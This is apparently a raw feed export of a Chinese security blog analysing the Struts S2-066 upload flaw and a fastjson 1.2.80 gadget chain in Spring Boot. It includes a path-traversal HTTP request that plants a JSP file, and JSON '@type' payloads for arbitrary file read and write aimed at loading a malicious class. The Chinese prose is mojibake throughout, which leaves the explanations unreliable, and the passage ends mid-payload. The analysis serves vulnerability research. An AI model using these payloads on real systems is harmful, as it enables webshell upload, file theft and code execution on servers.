class="string">&quot;()&quot;</span>) &amp;&amp; Character.isUpperCase(propertyName.substring(<span class="number">2</span>, <span class="number">3</span>).charAt(<span class="number">0</span>))) &#123;</span><br><span class="line">        <span class="keyword">return</span> propertyName;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="type">char</span> <span class="variable">first</span> <span class="operator">=</span> propertyName.charAt(<span class="number">0</span>);</span><br><span class="line">        <span class="type">char</span> <span class="variable">second</span> <span class="operator">=</span> propertyName.charAt(<span class="number">1</span>);</span><br><span class="line">        <span class="keyword">if</span> (Character.isLowerCase(first) &amp;&amp; Character.isUpperCase(second)) &#123;</span><br><span class="line">            <span class="keyword">return</span> propertyName;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="type">char</span>[] chars = propertyName.toCharArray();</span><br><span class="line">            chars[<span class="number">0</span>] = Character.toUpperCase(chars[<span class="number">0</span>]);</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">String</span>(chars);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è€Œè¿™ä¸ªæ—¶å€™<code>acceptableParameters</code>çš„é”®æ˜¯<code>[File Name]</code>ã€<code>[File Name]ContentType</code>ã€<code>[File Name]FileName</code>ã€‚è¿™é‡Œç¯å¢ƒçš„file nameä¸ºuploadï¼Œæ ¹æ®å‰é¢çš„ç†è®ºï¼Œå¦‚æœæ­¤æ—¶ä¸Šä¼ æ•°æ®åŒ…çš„<code>name</code>ä¸ºUploadï¼Œé‚£ä¹ˆä¹Ÿå¯ä»¥è·å–åˆ°ç›¸åŒçš„setteræ–¹æ³•å¹¶è°ƒç”¨èµ‹å€¼</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/s2vuls/s2066.action</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>127.0.0.1:8080</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>*/*</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>188</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>multipart/form-data; boundary=------------------------xmQEXKePZSVwNZmNjGHSafZOcxAMpAjXtGWfDZWN</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36</span><br><span class="line"></span><br><span class="line"><span class="language-pgsql"><span class="comment">--------------------------xmQEXKePZSVwNZmNjGHSafZOcxAMpAjXtGWfDZWN</span></span></span><br><span class="line"><span class="language-pgsql">Content-Disposition: form-data; <span class="type">name</span>=&quot;Upload&quot;; filename=&quot;1.txt&quot;</span></span><br><span class="line"><span class="language-pgsql">Content-<span class="keyword">Type</span>: <span class="type">text</span>/plain</span></span><br><span class="line"><span class="language-pgsql"></span></span><br><span class="line"><span class="language-pgsql">hello ph0ebus</span></span><br><span class="line"><span class="language-pgsql"><span class="comment">--------------------------xmQEXKePZSVwNZmNjGHSafZOcxAMpAjXtGWfDZWN--</span></span></span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2024/12/17/uX3WBJFt5HGZajA.png" alt="img"></p><p>é‚£ä¹ˆæ­¤æ—¶å¦‚æœ<code>acceptableParameters</code>å­˜åœ¨keyä¸º<code>uploadFileName</code>ã€å€¼å¯æ§çš„å…ƒç´ ï¼Œç”±äºå°å†™å­—æ¯<code>u</code>æ¯”å¤§å†™å­—æ¯<code>U</code>æ’åºæ›´é åï¼Œå°±å¯ä»¥å†æ¬¡è°ƒç”¨<code>setUploadFileName</code>è¦†ç›–è¿™é‡Œçš„å€¼ã€‚<code>acceptableParameters</code>æ¥æºäº<code>HttpParameters</code>ï¼Œäºæ˜¯å¯ä»¥æ§åˆ¶<code>HttpParameters</code>æ¥æ§åˆ¶<code>acceptableParameters</code>ï¼Œè€Œè¿™å°±æ˜¯HTTPæ•°æ®åŒ…çš„å‚æ•°</p><p>äºæ˜¯å°±å¯ä»¥æ„é€ æ•°æ®åŒ…</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/s2vuls/s2066.action?uploadFileName=../1234.jsp</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>127.0.0.1:8080</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>*/*</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>188</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>multipart/form-data; boundary=------------------------xmQEXKePZSVwNZmNjGHSafZOcxAMpAjXtGWfDZWN</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36</span><br><span class="line"></span><br><span class="line"><span class="language-pgsql"><span class="comment">--------------------------xmQEXKePZSVwNZmNjGHSafZOcxAMpAjXtGWfDZWN</span></span></span><br><span class="line"><span class="language-pgsql">Content-Disposition: form-data; <span class="type">name</span>=&quot;Upload&quot;; filename=&quot;1.txt&quot;</span></span><br><span class="line"><span class="language-pgsql">Content-<span class="keyword">Type</span>: <span class="type">text</span>/plain</span></span><br><span class="line"><span class="language-pgsql"></span></span><br><span class="line"><span class="language-pgsql"><span class="number">1</span>aaa</span></span><br><span class="line"><span class="language-pgsql"><span class="comment">--------------------------xmQEXKePZSVwNZmNjGHSafZOcxAMpAjXtGWfDZWN--</span></span></span><br></pre></td></tr></table></figure><p>GETä¼ å‚ï¼Œå‘<code>HttpParameters</code>å¢åŠ äº†keyä¸ºuploadFileNameçš„å…ƒç´ ï¼Œå€¼ä¹Ÿå°±æ˜¯ä¼ å…¥çš„å‚æ•°å€¼ï¼Œå¯æ§</p><p><img src="https://s2.loli.net/2024/12/17/jYXFnKmzGcTWOEl.png" alt="img"></p><p>äºæ˜¯é¡ºåˆ©è¿›å…¥åˆ°<code>com.opensymphony.xwork2.ognl.OgnlValueStack#setParameter</code>å¯»æ‰¾uploadFileNameè¿™ä¸ªå¯¹åº”setteræ–¹æ³•è¿›è¡Œè°ƒç”¨</p><p><img src="https://s2.loli.net/2024/12/17/a8i56znCEgWFYV1.png" alt="img"></p><p>å¯¹uploadFileNameè§„èŒƒåŒ–ä¸ºUploadFileName</p><p><img src="https://s2.loli.net/2024/12/17/daHiLrO54QDuocs.png" alt="img"></p><p>æˆåŠŸæ‹¿åˆ°<code>setUploadFileName</code>æ–¹æ³•</p><p><img src="https://s2.loli.net/2024/12/17/7Fx2ic5uPXdzJVr.png" alt="img"></p><p>è°ƒç”¨<code>setUploadFileName</code>æ–¹æ³•è¦†ç›–ä¸Šä¼ çš„æ–‡ä»¶å</p><p><img src="https://s2.loli.net/2024/12/17/oNiZxS74V5Hd8IO.png" alt="img"></p><h1 id="ç»“è¯­"><a href="#ç»“è¯­" class="headerlink" title="ç»“è¯­"></a>ç»“è¯­</h1><p>æœ€è¿‘çˆ†å‡ºæ¥çš„s2-067çœ‹é€šå‘Šè¯´å’ŒS2-066ç›¸ä¼¼ï¼Œäºæ˜¯å…ˆåˆ†æä¸€ä¸‹è¿™ä¸ªï¼Œè¿˜è›®æœ‰æ„æ€çš„ï¼Œä¼°è®¡S2-067æ˜¯åŸºäºè¿™ä¸ªçš„ç»•è¿‡å§</p>]]></content>
      
      
      <categories>
          
          <category> cve </category>
          
      </categories>
      
      
        <tags>
            
            <tag> security </tag>
            
            <tag> struts </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>fastjson1.2.80 in Springtbootæ–°é“¾å­¦ä¹ </title>
      <link href="/2024/12/12/fastjson1.2.80%20in%20Springtboot%E6%96%B0%E9%93%BE%E5%AD%A6%E4%B9%A0/"/>
      <url>/2024/12/12/fastjson1.2.80%20in%20Springtboot%E6%96%B0%E9%93%BE%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<blockquote><p>é¦–å‘äºå…ˆçŸ¥ç¤¾åŒºï¼š<a href="https://xz.aliyun.com/t/16708">https://xz.aliyun.com/t/16708</a></p></blockquote><p><a href="https://www.geekcon.top/doc/ppt/GC24_SpringBoot%E4%B9%8B%E6%AE%87.pdf">https://www.geekcon.top/doc/ppt/GC24_SpringBoot%E4%B9%8B%E6%AE%87.pdf</a></p><p><a href="http://squirt1e.top/2024/11/08/fastjson-1.2.80-springboot-xin-lian/">http://squirt1e.top/2024/11/08/fastjson-1.2.80-springboot-xin-lian/</a></p><p><a href="https://github.com/luelueking/CVE-2022-25845-In-Spring">GitHub - luelueking&#x2F;CVE-2022-25845-In-Spring: CVE-2022-25845(fastjson1.2.80) exploit in Spring Env!</a></p><h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1><p>æ‰€æœ‰ä¾èµ– Fastjson ç‰ˆæœ¬ 1.2.80 æˆ–æ›´æ—©ç‰ˆæœ¬çš„ç¨‹åºï¼Œåœ¨åº”ç”¨ç¨‹åºä¸­å¦‚æœåŒ…å«ä½¿ç”¨ç”¨æˆ·æ•°æ®è°ƒç”¨ <code>JSON.parse</code> æˆ– <code>JSON.parseObject</code> æ–¹æ³•ï¼Œä½†ä¸æŒ‡å®šè¦ååºåˆ—åŒ–çš„ç‰¹å®šç±»ï¼Œéƒ½ä¼šå—æ­¤æ¼æ´çš„å½±å“ã€‚</p><p><img src="https://s2.loli.net/2024/12/06/XhsNtREHD1KzVrp.webp"></p><p>åœ¨ä¹‹å‰çš„ç ”ç©¶ä¸­é’ˆå¯¹fj1.2.80å·²ç»æœ‰äº†ä¸‰ç§å¸¸è§çš„åˆ©ç”¨åœºæ™¯</p><p><a href="https://github.com/su18/hack-fastjson-1.2.80">GitHub - su18&#x2F;hack-fastjson-1.2.80</a></p><p><img src="https://s2.loli.net/2024/12/06/9lZtiaXscv7uyNq.png"></p><h1 id="æ¼æ´å¤ç°"><a href="#æ¼æ´å¤ç°" class="headerlink" title="æ¼æ´å¤ç°"></a>æ¼æ´å¤ç°</h1><p>éœ€è¦çš„ä¾èµ–</p><ul><li>jackson</li><li>commons-io</li></ul><p>æ€è·¯</p><ol><li>å°†InputStreamæ”¾å…¥fastjsonç¼“å­˜</li><li>è¯»å–&#x2F;tmpæ–‡ä»¶ä¸‹çš„æ–‡ä»¶ï¼Œæ‰¾åˆ°docbaseçš„æ–‡ä»¶åã€‚</li><li>å¾€${docbase}&#x2F;WEB-INF&#x2F;classes&#x2F;è·¯å¾„ä¸‹å†™å…¥æ¶æ„ç±»</li><li>é€šè¿‡fastjsonè§¦å‘ç±»åŠ è½½</li></ol><p><a href="https://github.com/ph0ebus/CVE-2022-25845-In-Spring">GitHub - ph0ebus&#x2F;CVE-2022-25845-In-Spring: exploit by python</a></p><p><img src="https://s2.loli.net/2024/12/06/1rDm25MnRZhdtNz.gif"></p><h1 id="æ¼æ´åˆ†æ"><a href="#æ¼æ´åˆ†æ" class="headerlink" title="æ¼æ´åˆ†æ"></a>æ¼æ´åˆ†æ</h1><h2 id="cache"><a href="#cache" class="headerlink" title="cache"></a>cache</h2><p>è¿™ä¸ªæ–°é“¾å­ä¹Ÿæ˜¯åˆ©ç”¨ç¼“å­˜æœºåˆ¶</p><p><img src="https://s2.loli.net/2024/12/06/gM8i1WPFYkQfujG.png"></p><p><strong>fastjsonååºåˆ—åŒ–ç¬¦åˆæ¡ä»¶çš„æœŸæœ›ç±»æ—¶ï¼Œä¼šå°†setterå‚æ•°ã€publicå­—æ®µã€æ„é€ å‡½æ•°å‚æ•°åŠ åˆ°ç¼“å­˜ä¸­ã€‚</strong></p><p><img src="https://s2.loli.net/2024/12/06/TQzRw5kqKnNpM3W.png"></p><p>å…ˆåˆ†æä¸€ä¸‹æ·»åŠ ç¼“å­˜çš„è¿‡ç¨‹ï¼Œä»¥ä¸‹é¢payloadä¸ºä¾‹</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;java.lang.Exception&quot;</span><span class="punctuation">,</span><span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;com.fasterxml.jackson.core.exc.InputCoercionException&quot;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2024/12/06/xHlC1AW4XiUVdzR.png"></p><p>åœ¨<code>TypeUtils.getClassFromMapping()</code>å°è¯•ä»ç¼“å­˜ä¸­è·å–<code>java.lang.Exception</code>ç±»</p><p><img src="https://s2.loli.net/2024/12/06/Hr6cygsBOCUnwM5.png"></p><p>åœ¨<code>com.alibaba.fastjson.util.TypeUtils#addBaseClassMappings</code>åˆå§‹åŒ–ä¸­é»˜è®¤æ·»åŠ äº†ä¸€äº›ä½œä¸ºç¼“å­˜äº†çš„ç±»ï¼Œå…¶ä¸­å°±åŒ…å«<code>Exception.class</code></p><p><img src="https://s2.loli.net/2024/12/06/nd2oNlJqp6Ajze8.png"></p><p>å¯ä»¥çœ‹åˆ°æœ‰95ä¸ªç¼“å­˜è¿‡çš„ç±»</p><p><img src="https://s2.loli.net/2024/12/06/yxBqvgV1sp7TGOS.png"></p><p>ä»ç¼“å­˜ä¸­è·å–classåè¿”å›ï¼Œç„¶åç»§ç»­æ¢å¤å…¶å­—æ®µä¿¡æ¯</p><p><code>com.alibaba.fastjson.parser.ParserConfig#getDeserializer</code>å…ˆé€šè¿‡è·å–åˆ°çš„classè·å–å¯¹åº”çš„ååºåˆ—åŒ–å™¨</p><p><img src="https://s2.loli.net/2024/12/06/T2lByerNkM6cW8Y.png"></p><p><img src="https://s2.loli.net/2024/12/06/cNfk6zqw3dyLC9i.png"></p><p>å¯ä»¥è·Ÿè¸ªåˆ°è¿™è¡Œå…³é”®ä»£ç </p><p><img src="https://s2.loli.net/2024/12/06/GjHWun9D54dt6PI.png"></p><p>æ ¹æ®å¼‚å¸¸å¤„ç†ç±»çš„ç»§æ‰¿å…³ç³»å¯ä»¥å‘ç°ï¼Œ<code>java.lang.Exception</code>ç±»ç¬¦åˆè¿™ä¸ªåˆ¤æ–­æ¡ä»¶ï¼Œäºæ˜¯ååºåˆ—åŒ–å™¨è¢«è®¾ç½®ä¸º<code>ThrowableDeserializer</code></p><p><img src="https://s2.loli.net/2024/12/06/XHfsk8andpSK3Ur.png"></p><p>åœ¨<code>com.alibaba.fastjson.parser.deserializer.ThrowableDeserializer#deserialze</code>ååºåˆ—åŒ–è¿‡ç¨‹ä¸­ä¼šå°†Exceptionä½œä¸ºæœŸæœ›ç±»</p><p><img src="https://s2.loli.net/2024/12/06/dknOhKfNLwu3WQA.png"></p><p>ç„¶åè§£æjsonä¸­çš„é”®å€¼å¯¹ï¼Œè¿™é‡Œkeyæ˜¯<code>@type</code></p><p><img src="https://s2.loli.net/2024/12/06/9Ny6nYQgdVkTKeb.png"></p><p>å½“keyä¸º<code>@type</code>æ—¶ä¼šå°†<code>Throwable.class</code>ä½œä¸ºæœŸæœ›ç±»ä¼ å…¥<code>com.alibaba.fastjson.parser.ParserConfig#checkAutoType()</code></p><p><img src="https://s2.loli.net/2024/12/06/wXdqfV7c92KbDRl.png"></p><p><img src="https://s2.loli.net/2024/12/06/vwoXLx7cret2W9K.png"></p><p>éœ€è¦ç»è¿‡é»‘åå•è¿‡æ»¤å’Œç™½åå•æ ¡éªŒ</p><p><img src="https://s2.loli.net/2024/12/06/TkJ2c3BC8besmRL.png"></p><p>ç»§ç»­è·Ÿè¿›åˆ°è¿™æ®µä»£ç ï¼Œæ ¹æ®ä¼ å…¥çš„Typenameæ¥åŠ è½½ç±»ï¼ŒåŠ è½½åï¼Œå¦‚æœæ˜¯æœŸæœ›ç±»çš„å­ç±»åˆ™åŠ å…¥åˆ°ç¼“å­˜mappingä¸­</p><p><img src="https://s2.loli.net/2024/12/06/oHIThNAP8EXvugj.png"></p><h2 id="read"><a href="#read" class="headerlink" title="read"></a>read</h2><p>è¿›ä¸€æ­¥åˆ†æä¸€ä¸‹ä»»æ„è¯»çš„payload</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;a&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&#123;    \&quot;@type\&quot;: \&quot;java.lang.Exception\&quot;,    \&quot;@type\&quot;: \&quot;com.fasterxml.jackson.core.exc.InputCoercionException\&quot;,    \&quot;p\&quot;: &#123;    &#125;  &#125;&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;b&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;$ref&quot;</span><span class="punctuation">:</span> <span class="string">&quot;$.a.a&quot;</span></span><br><span class="line">  <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;c&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&#123;  \&quot;@type\&quot;: \&quot;com.fasterxml.jackson.core.JsonParser\&quot;,  \&quot;@type\&quot;: \&quot;com.fasterxml.jackson.core.json.UTF8StreamJsonParser\&quot;,  \&quot;in\&quot;: &#123;&#125;&#125;&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;d&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;$ref&quot;</span><span class="punctuation">:</span> <span class="string">&quot;$.c.c&quot;</span></span><br><span class="line">  <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>åˆ©ç”¨å¾ªç¯å¼•ç”¨å°è¯•å°†å­—ç¬¦ä¸²è½¬æ¢ä¸ºå¯¹è±¡å¹¶è·å–å¯¹è±¡çš„å€¼ï¼ŒæŒ‰ä½œè€…çš„è¯æ¥è¯´ï¼Œè¿™é‡Œæ˜¯åˆ©ç”¨JsonPathæ¥å¿½ç•¥æœ¬æœ‰çš„å¼‚å¸¸</p><p>æ¥ç€ä¸Šé¢ç»§ç»­åˆ†æï¼Œæ¢å¤å¥½<code>com.fasterxml.jackson.core.exc.InputCoercionException</code>åï¼Œç»§ç»­åˆ©ç”¨<code>com.alibaba.fastjson.parser.deserializer.ThrowableDeserializer#deserialze</code>è·å–å­—æ®µï¼Œæ ¹æ®keyå®ä¾‹åŒ–å‡º<code>FieldDeserializer</code>è¿›ä¸€æ­¥å¤„ç†</p><p><img src="https://s2.loli.net/2024/12/06/1mtdVkABFxUzuPE.png"></p><p>ç»§ç»­ï¼Œè°ƒç”¨<code>TypeUtils#cast</code>è¿›è¡Œç±»å‹è½¬æ¢</p><p><img src="https://s2.loli.net/2024/12/06/2AmVsTXkhPcIag5.png"></p><p><code>com.alibaba.fastjson.util.TypeUtils#cast(java.lang.Object, java.lang.Class&lt;T&gt;, com.alibaba.fastjson.parser.ParserConfig)</code>ä¼šæ ¹æ®ä¼ å…¥çš„objè¿›è¡Œç›¸åº”çš„ç±»å‹è½¬æ¢ï¼Œè¿™é‡Œä¼šè¿›å…¥<code>Map</code>ç±»å‹è¿™ä¸ªåˆ†æ”¯</p><p><img src="https://s2.loli.net/2024/12/06/1bdjB2WZv9KYMue.png"></p><p>è·Ÿè¿›åˆ°<code>com.alibaba.fastjson.util.TypeUtils#castToJavaBean(java.util.Map&lt;java.lang.String,java.lang.Object&gt;, java.lang.Class&lt;T&gt;, com.alibaba.fastjson.parser.ParserConfig)</code>ï¼Œæ ¹æ®æ„é€ æ–¹æ³•å‚æ•°ç±»å‹clazzè·å–ååºåˆ—åŒ–å™¨ï¼Œclazzä¸º<code>com.fasterxml.jackson.core.JsonParser</code></p><p><img src="https://s2.loli.net/2024/12/06/EsxcvjRPyHqXbmd.png"></p><p>è·å–åˆ°ååºåˆ—åŒ–å™¨åï¼Œè°ƒç”¨<code>putDeserializer</code>å‡½æ•°<code>this.deserializers.put(type, deserializer)</code></p><p><img src="https://s2.loli.net/2024/12/06/869YZ2PbcfTDQxn.png"></p><p>è¿™é‡Œå°±ä¼šå°†<code>type</code>å’Œ<code>deserializer</code>å­˜å…¥<code>com.alibaba.fastjson.util.IdentityHashMap#buckets</code>ä¸­</p><p><img src="https://s2.loli.net/2024/12/06/wf7eKacL3WOUbvq.png"></p><p>åœ¨åç»­æ¢å¤<code>com.fasterxml.jackson.core.JsonParser</code>ä¸­ï¼Œè°ƒç”¨<code>this.deserializers.findClass(typeName)</code>å°±å¯ä»¥ä»<code>com.alibaba.fastjson.util.IdentityHashMap#buckets</code>ä¸­è·å–åˆ°è¿™ä¸ªç±»</p><p><img src="https://s2.loli.net/2024/12/06/28W3JEz6vQjDeAI.png"></p><p><img src="https://s2.loli.net/2024/12/06/C7JuiNVTBd5RDxr.png"></p><p>è€Œ<code>com.fasterxml.jackson.core.json.UTF8StreamJsonParser</code>æ˜¯<code>com.fasterxml.jackson.core.JsonParser</code>çš„å­ç±»ï¼Œç±»ä¼¼å‰é¢åˆ©ç”¨<code>java.lang.Exception</code>æ¢å¤<code>com.fasterxml.jackson.core.exc.InputCoercionException</code>ä¸€æ ·</p><p><img src="https://s2.loli.net/2024/12/06/YW4jfn9QCVzU6qH.png"></p><p>å› ä¸ºå®ç°JsonParserçš„ç±»ä¸­åªæœ‰<code>UTF8StreamJsonParser</code>çš„æ„é€ å‚æ•°å­˜åœ¨<code>InputStream</code>ï¼Œå› æ­¤å¯ä»¥è¿›ä¸€æ­¥è·å–åˆ°<code>InputStream</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">UTF8StreamJsonParser</span><span class="params">(IOContext ctxt, <span class="type">int</span> features, InputStream in, ObjectCodec codec, ByteQuadsCanonicalizer sym, <span class="type">byte</span>[] inputBuffer, <span class="type">int</span> start, <span class="type">int</span> end, <span class="type">int</span> bytesPreProcessed, <span class="type">boolean</span> bufferRecyclable)</span> &#123;</span><br><span class="line">    <span class="built_in">super</span>(ctxt, features);</span><br><span class="line">    <span class="built_in">this</span>._quadBuffer = <span class="keyword">new</span> <span class="title class_">int</span>[<span class="number">16</span>];</span><br><span class="line">    <span class="built_in">this</span>._inputStream = in;</span><br><span class="line">    <span class="built_in">this</span>._objectCodec = codec;</span><br><span class="line">    <span class="built_in">this</span>._symbols = sym;</span><br><span class="line">    <span class="built_in">this</span>._inputBuffer = inputBuffer;</span><br><span class="line">    <span class="built_in">this</span>._inputPtr = start;</span><br><span class="line">    <span class="built_in">this</span>._inputEnd = end;</span><br><span class="line">    <span class="built_in">this</span>._currInputRowStart = start - bytesPreProcessed;</span><br><span class="line">    <span class="built_in">this</span>._currInputProcessed = (<span class="type">long</span>)(-start + bytesPreProcessed);</span><br><span class="line">    <span class="built_in">this</span>._bufferRecyclable = bufferRecyclable;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2024/12/06/HR4eImwvabdiuNn.png"></p><p>è€Œè·å–<code>InputStream</code>å°±æ˜¯ä¸ºäº†å®ç°ä»»æ„æ–‡ä»¶è¯»</p><p><a href="https://mp.weixin.qq.com/s/esjHYVm5aCJfkT6I1D0uTQ">fastjson è¯»æ–‡ä»¶ gadget çš„åˆ©ç”¨åœºæ™¯æ‰©å±•</a></p><p>åŸblackhat usa 21çš„è®®é¢˜ppt</p><p><a href="https://i.blackhat.com/USA21/Wednesday-Handouts/US-21-Xing-How-I-Used-a-JSON.pdf">https://i.blackhat.com/USA21/Wednesday-Handouts/US-21-Xing-How-I-Used-a-JSON.pdf</a></p><p>è¿™é‡Œå°±æ˜¯é€šè¿‡<code>org.apache.commons.io.input.BOMInputStream</code>æ¥é€å­—èŠ‚ç›²è¯»å–æ–‡ä»¶</p><p><img src="https://s2.loli.net/2024/12/06/IvcKEtwdb4z8B5r.png"></p><p>åœ¨<code>org.apache.commons.io.input.BOMInputStream#getBOM</code>ä¸­ä¼šè°ƒç”¨<code>org.apache.commons.io.input.BOMInputStream#find</code>æ–¹æ³•</p><p><img src="https://s2.loli.net/2024/12/06/cYSRWoUDg19bJaq.png"></p><p>è·Ÿè¿›findæ–¹æ³•å¯ä»¥å‘ç°ï¼Œè¿™é‡Œå…ˆæŠŠ delegate è¾“å…¥æµçš„å­—èŠ‚ç è½¬æˆ int æ•°ç»„ï¼Œç„¶åæ‹¿ <code>ByteOrderMark</code>é‡Œçš„ bytes æŒ¨ä¸ªå­—èŠ‚éå†å»æ¯”å¯¹ï¼Œå¦‚æœéå†è¿‡ç¨‹æœ‰æ¯”å¯¹é”™è¯¯çš„ï¼Œ<code>getBom</code>æ–¹æ³• å°±ä¼šè¿”å›<code>null</code>ï¼Œå¦‚æœéå†ç»“æŸï¼Œæ²¡æœ‰æ¯”å¯¹é”™è¯¯é‚£å°±ä¼šè¿”å›ä¸€ä¸ª<code>ByteOrderMark</code>å¯¹è±¡</p><p><img src="https://s2.loli.net/2024/12/06/YvrIkgVilx2AhZ4.png"></p><p>å› æ­¤é€å­—èŠ‚ç›²è¯»å–çš„å…³é”®å·®å¼‚ç‚¹å°±åœ¨è¿™é‡Œ</p><p>æœ€åè¾“å…¥æµæ¥æºæ¥è‡ªäº<code>jdk.nashorn.api.scripting.URLReader</code>ï¼Œ<code>public URLReader(URL url)</code>å¯ä»¥ä¼ å…¥ä¸€ä¸ª URL å¯¹è±¡ã€‚è¿™å°±æ„å‘³ç€ file jar http ç­‰åè®®éƒ½å¯ä»¥ä½¿ç”¨ã€‚è¿™é‡Œä¼ å…¥äº†fileåè®®ç”¨äºåˆ—ä¸¾ç›®å½•</p><h2 id="write"><a href="#write" class="headerlink" title="write"></a>write</h2><p>ç„¶ååˆ†æä¸€ä¸‹ä»»æ„æ–‡ä»¶å†™çš„payload</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;a&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;java.io.InputStream&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;org.apache.commons.io.input.AutoCloseInputStream&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;in&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;org.apache.commons.io.input.TeeInputStream&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;input&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;org.apache.commons.io.input.CharSequenceInputStream&quot;</span><span 